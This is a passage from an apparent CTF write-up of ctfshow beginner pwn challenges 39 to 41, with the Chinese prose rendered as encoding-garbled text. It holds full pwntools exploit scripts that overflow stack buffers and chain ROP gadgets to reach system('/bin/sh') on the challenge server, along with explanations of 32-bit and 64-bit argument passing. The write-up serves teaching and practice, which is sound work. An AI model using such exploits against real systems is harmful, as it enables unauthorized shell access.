<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span> <span class="mi">28147</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">backdoor</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;backdoor&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x400287</span> <span class="c1"># 0x0000000000400287 : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="n">cyclic</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">backdoor</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="pwn_039">PWN_039
</h3><p>é¢˜ç›®ï¼š32ä½çš„ system(); &ldquo;/bin/sh&rdquo;ã€‚</p>
<p>checksecä¸€ä¸‹ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114.png"
	width="750"
	height="210"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114_hu_ffd0edb80748b701.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/114_hu_ed469b05f80e7568.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="357"
		data-flex-basis="857px"
	
></p>
<p>å¯ä»¥çœ‹åˆ°æ²¡å¼€å¯canaryã€PIEä¿æŠ¤çš„ï¼Œå­˜åœ¨å¯åˆ©ç”¨æ ˆæº¢å‡ºæ¼æ´çš„å¯èƒ½ã€‚</p>
<p>IDAï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115.png"
	width="1000"
	height="450"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115_hu_e696ee341380586.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/115_hu_a20ea7fd6a1243a2.png 1024w"
	loading="lazy"
	
		alt="32ä½çš„IDAåˆ†æ"
	
	
		class="gallery-image" 
		data-flex-grow="222"
		data-flex-basis="533px"
	
></p>
<p>è·Ÿè¿›ctfshowå‡½æ•°å‘ç°æ ˆæº¢å‡ºï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116.png"
	width="596"
	height="140"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116_hu_1199a62a52d94a2a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/116_hu_d138901c5d88e68e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="425"
		data-flex-basis="1021px"
	
></p>
<p>å¯ä»¥è¯»å–50ä¸ªå­—ç¬¦ç»™bufï¼Œä½†bufå®¹é‡åªæœ‰14ï¼Œæ‰€ä»¥è¶…è¿‡14å°±ä¼šé€ æˆæ ˆæº¢å‡ºã€‚</p>
<p>æ¥ç€åœ¨å‡½æ•°ç›®å½•çœ‹åˆ°hintå‡½æ•°æœ‰çŒ«è…»ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117.png"
	width="854"
	height="390"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117_hu_25ebd19a12518947.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/117_hu_27e696ef37eed855.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="218"
		data-flex-basis="525px"
	
></p>
<p>é‚£ä¹ˆå¤§è‡´çš„expæ€è·¯å°±æ¥äº†ï¼šä¹Ÿå°±æ˜¯å…ˆcyclicå‡½æ•°ç”Ÿæˆåƒåœ¾å€¼è¦†ç›–å±€éƒ¨å˜é‡å’Œebpå¯„å­˜å™¨æœ¬èº«ï¼›ä½†æ˜¯åªæœ‰systemå‡½æ•°å’Œ/bin/shï¼Œå´æ²¡æœ‰system(â€œ/bin/shâ€);çš„åé—¨ï¼Œæ‰€ä»¥æˆ‘ä»¬åªèƒ½æ„é€ å‡ºæ¥ã€‚</p>
<p>åœ¨ç¼–å†™expæ—¶ï¼Œå› ä¸ºç¨‹åºæ˜¯32ä½ï¼Œæ‰€ä»¥è¯´ä¸ç”¨å»è€ƒè™‘å®ƒçš„å †æ ˆå¹³è¡¡ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28216</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x8048750</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0x12</span><span class="o">+</span><span class="mi">4</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">system</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p32</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œçš„p32(0)ç­‰äº4å­—èŠ‚ï¼Œå¯ä»¥ç”¨å››ä¸ªaæˆ–è€…cyclic(4)ä»£æ›¿ä¹Ÿè¡Œï¼Œè¿™æ—¶32ä½ä¸‹systemå‡½æ•°çš„è¿”å›åœ°å€å ä½ç¬¦ï¼Œç„¶åå°±åˆ°æ‰§è¡Œ/bin/shï¼Œé‚£å°±æ˜¯è·³è½¬åˆ°å®ƒçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118.png"
	width="1155"
	height="119"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118_hu_e5e93807f34b7bdd.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/118_hu_875bb0d0ab4ca27d.png 1024w"
	loading="lazy"
	
		alt="/bin/shå­—ç¬¦ä¸²çš„åœ°å€"
	
	
		class="gallery-image" 
		data-flex-grow="970"
		data-flex-basis="2329px"
	
></p>
<p>è¿™æ ·å­æˆ‘ä»¬å°±æ„é€ å‡ºsystem(&quot;/bin/sh&quot;);äº†ï¼Œç„¶åè¿›å…¥äº¤äº’æ¨¡å¼è·å¾—flagã€‚</p>
<p>è¿™é¢˜ä¸»è¦è€ƒå¯Ÿæˆ‘ä»¬å¯¹äºå‡½æ•°çš„æ„é€ ä»¥åŠå‡½æ•°åœ°å€çš„æ‹¼æ¥ã€æ ˆçš„ç»“æ„ç»„æˆã€‚éœ€è¦å¤šçœ‹çœ‹æˆ‘çš„PWN-2å•Šã€‚ã€‚ã€‚ã€‚</p>
<h3 id="pwn_040">PWN_040
</h3><p>é¢˜ç›®ï¼š64ä½çš„ system(); &ldquo;/bin/sh&rdquo;ã€‚</p>
<p>IDA64ä½åˆ†æï¼Œè·Ÿè¿›ctfshowå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119.png"
	width="551"
	height="149"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119_hu_4361ba4a461d934e.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/119_hu_d335e677bd05e71e.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="369"
		data-flex-basis="887px"
	
></p>
<p>checksecçœ‹åˆ°æœªæ‰“å¼€canaryä¿æŠ¤ï¼Œè€Œä¸”åœ¨ctfshowå‡½æ•°è¿™å‘ç°æœ‰æ ˆæº¢å‡ºã€‚</p>
<p>è·Ÿè¿›hintå‡½æ•°ï¼Œå‘ç°åé—¨ã€‚</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120.png"
	width="540"
	height="125"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120_hu_ac0e24a915fef2c8.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/120_hu_a859f06ba4c0b768.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="432"
		data-flex-basis="1036px"
	
></p>
<p>ç”¨ROPgadgetå‘½ä»¤æŸ¥è¯¢retåœ°å€ï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">ROPgadget --binary ./pwn <span class="p">|</span> grep ret
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121.png"
	width="1224"
	height="450"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121_hu_749e2c86a93f982a.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/121_hu_9f8cdc6270b0312a.png 1024w"
	loading="lazy"
	
		alt="retåœ°å€æŸ¥è¯¢"
	
	
		class="gallery-image" 
		data-flex-grow="272"
		data-flex-basis="652px"
	
></p>
<p>æŸ¥è¯¢/bin/shçš„åœ°å€ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122.png"
	width="1135"
	height="105"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122_hu_8e4f1859de6b1d4c.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/122_hu_772a3258af0a8472.png 1024w"
	loading="lazy"
	
		alt="/bin/shçš„åœ°å€ï¼š0x400808"
	
	
		class="gallery-image" 
		data-flex-grow="1080"
		data-flex-basis="2594px"
	
></p>
<p>expï¼š</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
</span></span><span class="line"><span class="cl"><span class="n">context</span><span class="o">.</span><span class="n">log_level</span> <span class="o">=</span> <span class="s1">&#39;debug&#39;</span>
</span></span><span class="line"><span class="cl"><span class="c1">#io = process(&#39;./pwn&#39;)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s1">&#39;pwn.challenge.ctf.show&#39;</span><span class="p">,</span><span class="mi">28194</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">elf</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s1">&#39;./pwn&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">system</span> <span class="o">=</span> <span class="n">elf</span><span class="o">.</span><span class="n">sym</span><span class="p">[</span><span class="s1">&#39;system&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl"><span class="n">bin_sh</span> <span class="o">=</span> <span class="mh">0x400808</span>
</span></span><span class="line"><span class="cl"><span class="n">pop_rdi</span> <span class="o">=</span> <span class="mh">0x4007e3</span> <span class="c1"># 0x00000000004007e3 : pop rdi ; ret</span>
</span></span><span class="line"><span class="cl"><span class="n">ret</span> <span class="o">=</span> <span class="mh">0x4004fe</span> <span class="c1"># 0x00000000004004fe : ret</span>
</span></span><span class="line"><span class="cl"><span class="n">payload</span> <span class="o">=</span> <span class="s1">&#39;a&#39;</span><span class="o">*</span><span class="p">(</span><span class="mh">0xA</span><span class="o">+</span><span class="mi">8</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">pop_rdi</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">bin_sh</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">ret</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">system</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">sendline</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">recv</span><span class="p">()</span>
</span></span><span class="line"><span class="cl"><span class="n">io</span><span class="o">.</span><span class="n">interactive</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>æ¬¸ä¸ºä»€ä¹ˆexpçš„payloadä¸­çš„å‚æ•°ä¸å¤ªä¸€æ ·ï¼Ÿ</p>
<blockquote class="alert alert-note">
    <blockquote>
<h3 id="32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº"><strong>32ä½å’Œ64ä½å¯æ‰§è¡Œç¨‹åºçš„å‚æ•°ä¼ é€’é¡ºåº</strong>
</h3><p>å³ä½¿æ€è·¯ä¸€æ ·ä½†æ¶æ„ä¸ä¸€æ ·ï¼Œåœ¨å†™payloadçš„æ—¶å€™æ³¨å…¥åœ°å€çš„é¡ºåºä¹Ÿæ˜¯ä¸ä¸€æ ·çš„ï¼š</p>
<ul>
<li><strong>32 ä½ç¨‹åºï¼ˆPWN039ï¼‰</strong>ï¼š32 ä½ç¨‹åºä¸­ï¼Œå‡½æ•°å‚æ•°é€šè¿‡æ ˆä¼ é€’ã€‚åœ¨ PWN039 é‡Œï¼Œ<code>system</code>å‡½æ•°åœ°å€ç´§è·Ÿåœ¨å¡«å……æ•°æ®ä¹‹åï¼Œè¿™æ˜¯å› ä¸ºæº¢å‡ºåç›´æ¥è¦†ç›–è¿”å›åœ°å€ä¸º<code>system</code>å‡½æ•°åœ°å€ï¼Œè®©ç¨‹åºæ‰§è¡Œ<code>system</code>å‡½æ•°ã€‚åœ¨<code>payload = 'a'*(0x12 + 4) + p32(system) + p32(0) + p32(bin_sh)</code>ä¸­ï¼Œ<code>'a'*(0x12 + 4)</code>ç”¨äºå¡«å……ç¼“å†²åŒºå¹¶è¦†ç›–åŸè¿”å›åœ°å€ï¼Œ<code>p32(system)</code>å°†è¿”å›åœ°å€ä¿®æ”¹ä¸º<code>system</code>å‡½æ•°åœ°å€ ï¼Œ<code>p32(0)</code>æ˜¯ä¸ºäº†æ»¡è¶³æ ˆç»“æ„ï¼Œä½œä¸º<code>system</code>å‡½æ•°æ‰§è¡Œåçš„è¿”å›åœ°å€ï¼ˆå®é™…æ‰§è¡Œä¸­å¹¶ä¸é‡è¦ï¼Œå¯éšæ„å¡«å…… 4 å­—èŠ‚ï¼‰ï¼Œ<code>p32(bin_sh)</code>åˆ™æ˜¯<code>system</code>å‡½æ•°çš„å‚æ•°ï¼Œå³<code>/bin/sh</code>å­—ç¬¦ä¸²çš„åœ°å€ã€‚è¿™æ ·çš„é¡ºåºç¬¦åˆ 32 ä½ç¨‹åºé€šè¿‡æ ˆä¼ å‚å’Œæ§åˆ¶ç¨‹åºæ‰§è¡Œæµçš„ç‰¹ç‚¹ã€‚</li>
<li><strong>64 ä½ç¨‹åºï¼ˆPWN40ï¼‰</strong>ï¼š64 ä½ç¨‹åºçš„å‡½æ•°è°ƒç”¨è§„åˆ™æœ‰æ‰€ä¸åŒï¼Œå‰ 6 ä¸ªå‚æ•°ä¼˜å…ˆé€šè¿‡å¯„å­˜å™¨ä¼ é€’ï¼Œå…¶ä¸­ç¬¬ä¸€ä¸ªå‚æ•°å­˜æ”¾åœ¨<code>rdi</code>å¯„å­˜å™¨ã€‚åœ¨ PWN40 ä¸­ï¼Œ<code>payload = 'a'*(0xA + 8) + p64(pop_rdi) + p64(bin_sh) + p64(ret) + p64(system)</code> ï¼Œ<code>'a'*(0xA + 8)</code>ç”¨äºå¡«å……ç¼“å†²åŒºå’Œè¦†ç›–åŸè¿”å›åœ°å€ï¼›<code>p64(pop_rdi)</code>å°†<code>pop_rdi</code>æŒ‡ä»¤åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œæ‰§è¡Œ<code>pop_rdi</code>æŒ‡ä»¤æ—¶ï¼Œä¼šæŠŠç´§è·Ÿå…¶åçš„<code>p64(bin_sh)</code>ä¸­çš„<code>/bin/sh</code>åœ°å€å¼¹å‡ºåˆ°<code>rdi</code>å¯„å­˜å™¨ï¼Œä½œä¸º<code>system</code>å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°ï¼›<code>p64(ret)</code>ç”¨äºæ ˆå¯¹é½ï¼ˆ64 ä½ç¨‹åºè°ƒç”¨å‡½æ•°å‰éœ€è¦ä¿è¯æ ˆ 16 å­—èŠ‚å¯¹é½ï¼Œ<code>ret</code>æŒ‡ä»¤å¯è°ƒæ•´æ ˆæŒ‡é’ˆï¼‰ï¼›æœ€å<code>p64(system)</code>å°†<code>system</code>å‡½æ•°åœ°å€æ”¾å…¥æ ˆä¸­ï¼Œå½“ç¨‹åºæ‰§è¡Œåˆ°è¿™é‡Œæ—¶ï¼Œä¼šè·³è½¬åˆ°<code>system</code>å‡½æ•°æ‰§è¡Œï¼Œæ­¤æ—¶<code>rdi</code>å¯„å­˜å™¨ä¸­å·²æ­£ç¡®è®¾ç½®äº†å‚æ•°<code>/bin/sh</code>çš„åœ°å€ã€‚</li>
</ul>
</blockquote></blockquote>
<h3 id="pwn_041">PWN_041
</h3><h4 id="é¢˜ç›®-1">é¢˜ç›®ï¼š
</h4><p>32ä½çš„ system(); ä½†æ˜¯æ²¡&quot;/bin/sh&quot; ï¼Œå¥½åƒæœ‰å…¶ä»–çš„å¯ä»¥æ›¿ä»£ã€‚</p>
<p>checksecä¸€ä¸‹ï¼Œç„¶åIDAåˆ†æ</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126.png"
	width="1055"
	height="206"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126_hu_50a6b7b4540d004f.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/126_hu_a5b594f7bf368fe2.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="512"
		data-flex-basis="1229px"
	
></p>
<p>ä¸èƒ½ç”¨ret2shellcodeäº†ã€‚</p>
<p>è¿™é‡Œå’Œä¸Šé¢˜å·®ä¸å¤šï¼Œæ‰¾ä¸€ä¸‹/bin/shï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123.png"
	width="1550"
	height="630"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123_hu_bbacdeabd557b527.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/123_hu_7ec5c23639120ed9.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="246"
		data-flex-basis="590px"
	
></p>
<p>æ‰¾ä¸åˆ°ï¼Œä½†æ‰¾åˆ°shï¼š</p>
<blockquote class="alert alert-note">
    <blockquote>
<h4 id="binshå’Œshçš„æ ¸å¿ƒåŒºåˆ«"><strong>/bin/shå’Œshçš„æ ¸å¿ƒåŒºåˆ«</strong>
</h4><p>å…³é”®åœºæ™¯ï¼šèƒ½å¦æ›¿ä»£å–å†³äºã€Œè°ƒç”¨å‡½æ•°çš„è¦æ±‚ã€</p>
<p>PWN ä¸­æœ€å¸¸ç”¨çš„æ˜¯é€šè¿‡ <code>execveã€system</code> å‡½æ•°æ‰§è¡Œ Shellï¼ˆå¦‚æ„é€  <code>execve(&quot;/bin/sh&quot;, NULL, NULL)</code> è·å¾—äº¤äº’æƒé™ï¼‰ï¼Œæ­¤å¤–ä¹Ÿå¯èƒ½æ¶‰åŠ <code>system</code> å‡½æ•°ï¼Œä¸¤è€…å¯¹å‚æ•°çš„è¦æ±‚ä¸åŒï¼š</p>
<p>åœºæ™¯ 1ï¼š<code>execve</code> å‡½æ•°ï¼ˆå¿…é¡»ç”¨ç»å¯¹è·¯å¾„ï¼Œ<code>sh</code> ä¸å¯æ›¿ä»£ <code>/bin/sh</code>ï¼‰</p>
<p><code>execve</code> æ˜¯ Linux ç³»ç»Ÿè°ƒç”¨ï¼Œä½œç”¨æ˜¯åŠ è½½å¹¶æ‰§è¡Œæ–°ç¨‹åºï¼Œå…¶ç¬¬ä¸€ä¸ªå‚æ•°<strong>å¿…é¡»æ˜¯ç¨‹åºçš„ç»å¯¹è·¯å¾„</strong>ï¼ˆæˆ–ç›¸å¯¹è·¯å¾„ï¼Œä½†ç»å¯¹è·¯å¾„æ˜¯ PWN ä¸­çš„å¸¸è§„é€‰æ‹©ï¼‰ï¼Œå¦åˆ™ä¼šæŠ¥é”™ã€ŒNo such file or directoryã€ã€‚</p>
<ul>
<li>æ­£ç¡®ç”¨æ³•ï¼š<code>execve(&quot;/bin/sh&quot;, ...)</code>ï¼ˆç³»ç»Ÿç›´æ¥å®šä½åˆ° <code>/bin/sh</code>ï¼Œæ‰§è¡ŒæˆåŠŸï¼‰ã€‚</li>
<li>é”™è¯¯ç”¨æ³•ï¼š<code>execve(&quot;sh&quot;, ...)</code>ï¼ˆç³»ç»Ÿä¸çŸ¥é“ <code>sh</code> åœ¨å“ªé‡Œï¼Œä¼šéå† <code>$PATH</code> æŸ¥æ‰¾ï¼Œä½† <code>execve</code> ä¸æ”¯æŒé€šè¿‡ <code>$PATH</code> è§£æå‘½ä»¤åï¼Œç›´æ¥å¤±è´¥ï¼‰ã€‚</li>
</ul>
<p>å› æ­¤ï¼Œåœ¨æ„é€  <code>execve</code> è°ƒç”¨æ—¶ï¼Œ<strong>åªèƒ½ç”¨ <code>/bin/sh</code>ï¼Œä¸èƒ½ç”¨ <code>sh</code></strong>ã€‚</p>
<p>åœºæ™¯ 2ï¼š<code>system</code> å‡½æ•°ï¼ˆ<code>sh</code> å’Œ <code>/bin/sh</code> æ•ˆæœä¸€è‡´ï¼Œå¯æ›¿ä»£ï¼‰</p>
<p><code>system</code> å‡½æ•°çš„åº•å±‚é€»è¾‘æ˜¯ã€Œè°ƒç”¨ <code>/bin/sh -c</code> æ¥æ‰§è¡Œå‚æ•°ä¸­çš„å‘½ä»¤ã€ï¼Œå…¶å‚æ•°æ”¯æŒã€Œå‘½ä»¤åã€æˆ–ã€Œç»å¯¹è·¯å¾„ã€ï¼š</p>
<ul>
<li>è‹¥ä¼  <code>system(&quot;sh&quot;)</code>ï¼š<code>system</code> ä¼šè‡ªåŠ¨é€šè¿‡ <code>$PATH</code> æ‰¾åˆ° <code>sh</code>ï¼ˆå³ <code>/bin/sh</code>ï¼‰ï¼Œç­‰ä»·äºæ‰§è¡Œ <code>/bin/sh -c sh</code>ï¼Œæœ€ç»ˆå¯åŠ¨ Shellã€‚</li>
<li>è‹¥ä¼  <code>system(&quot;/bin/sh&quot;)</code>ï¼šç­‰ä»·äºæ‰§è¡Œ <code>/bin/sh -c /bin/sh</code>ï¼ŒåŒæ ·å¯åŠ¨ Shellã€‚</li>
</ul>
<p>å› æ­¤ï¼Œåœ¨ä½¿ç”¨ <code>system</code> å‡½æ•°æ—¶ï¼Œ<strong><code>sh</code> å’Œ <code>/bin/sh</code> æ•ˆæœå®Œå…¨ä¸€è‡´ï¼Œå¯ä»¥äº’ç›¸æ›¿ä»£</strong>ã€‚</p>
<p><strong>ç‰¹æ®Šæƒ…å†µ</strong>ï¼šç¯å¢ƒå˜é‡ <code>$PATH</code> è¢«ç¯¡æ”¹ï¼ˆ<code>sh</code> å¯èƒ½å¤±æ•ˆï¼Œ<code>/bin/sh</code> æ›´å¯é ï¼‰</p>
<p>è™½ç„¶å¤šæ•°æƒ…å†µä¸‹ <code>$PATH</code> åŒ…å« <code>/bin</code>ï¼Œä½†å¦‚æœç›®æ ‡ç¨‹åºè¿è¡Œæ—¶ç¯¡æ”¹äº† <code>$PATH</code>ï¼ˆå¦‚åˆ é™¤ <code>/bin</code> ç›®å½•ï¼‰ï¼Œæ­¤æ—¶ï¼š</p>
<ul>
<li>ç”¨ <code>sh</code> ä¼šå›  <code>$PATH</code> ä¸­æ‰¾ä¸åˆ° <code>sh</code> è€Œå¤±è´¥ï¼›</li>
<li>ç”¨ <code>/bin/sh</code> å› æ˜¯ç»å¯¹è·¯å¾„ï¼Œä¸å— <code>$PATH</code> å½±å“ï¼Œä¾ç„¶èƒ½æˆåŠŸæ‰§è¡Œã€‚</li>
</ul>
<p>PWN åˆ©ç”¨ä¸­ä¸ºäº†ã€Œå…¼å®¹æ€§å’Œç¨³å®šæ€§ã€ï¼Œå³ä½¿æ˜¯ <code>system</code> å‡½æ•°ï¼Œä¹Ÿæ›´æ¨èå†™ <code>/bin/sh</code> è€Œé <code>sh</code>ï¼ˆé¿å…å› ç¯å¢ƒå˜é‡å¼‚å¸¸å¯¼è‡´åˆ©ç”¨å¤±è´¥ï¼‰ã€‚</p>
</blockquote></blockquote>
<p>è¿™é‡Œè·Ÿè¿›hintå‡½æ•°ï¼š</p>
<p><img src="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125.png"
	width="838"
	height="150"
	srcset="/p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125_hu_2475afccf8340c50.png 480w, /p/ctfshow-%E5%85%A5%E9%97%A8pwn-writeup/125_hu_f610554b4ea5f28d.png 1024w"
	loading="lazy"
	
	
		class="gallery-image" 
		data-flex-grow="558"
		data-flex-basis="1340px"
	
></p>
